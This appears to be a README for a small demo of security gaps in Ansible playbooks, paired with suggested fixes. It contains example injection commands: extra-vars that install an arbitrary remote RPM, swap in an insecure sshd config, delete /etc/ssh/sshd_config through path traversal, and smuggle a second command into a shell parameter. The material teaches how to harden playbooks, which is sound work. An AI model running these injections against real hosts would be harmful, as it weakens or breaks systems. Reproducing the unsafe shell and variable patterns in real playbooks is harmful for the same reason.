# Demo

Small demo to exploit security gaps in playbooks.

## install-packages

Run the playbook first with `-C -D`:

```bash
ansible-playbook install-packages.yml -C -D
```

1. Use `no_log: true`, run again.

2. Install other package:

```bash
ansible-playbook install-packages.yml -e nginx_package_path=https://download.rockylinux.org/pub/rocky/9.2/devel/x86_64/os/Packages/v/vsftpd-3.0.5-4.el9.x86_64.rpm
```

## deploy-configuration

Run the playbook:

```bash
ansible-playbook deploy-configuration.yml -C -D
```

Run again and overwrite template with insecure one:

```bash
ansible-playbook deploy-configuration.yml -C -D -e sshd_config=/tmp/sshd-config-insecure
```

Run again and delete a file, which has nothing to do with the actual task:

```bash
ansible-playbook deploy-configuration.yml -C -D -e "disallowed_repo_definition_list=['/etc/ssh/sshd_config']"
```

Possible fixes? 

1. Don't use absolute paths?

Variable:

```yaml
disallowed_repo_definition_list:
  - epel-testing.repo
  - rocky-devel.repo
```

Task:

```bash
- name: Ensure testing or devel repositories are absent
  ansible.builtin.file:
    path: "/etc/yum.repos.d/{{ item }}"
    state: absent
  loop: "{{ disallowed_repo_definition_list }}"
  become: true
```

Can still be worked around with:

```bash
ansible-playbook deploy-configuration.yml -C -D -e "disallowed_repo_definition_list=['../../etc/ssh/sshd_config']"
```

--> Hardcode the list.

## command-vs-shell

```bash
ansible-playbook command-vs-shell.yml -e "login_parameters_list=['something & yum -y install httpd']"
```

```bash
ansible demo -a "yum info httpd"
```

Possible fixes:

1. Use `quote` filter on variable
2. Use command instead of shell --> pipe's do not work anymore.
3. Use `slurp` module to get content of file.
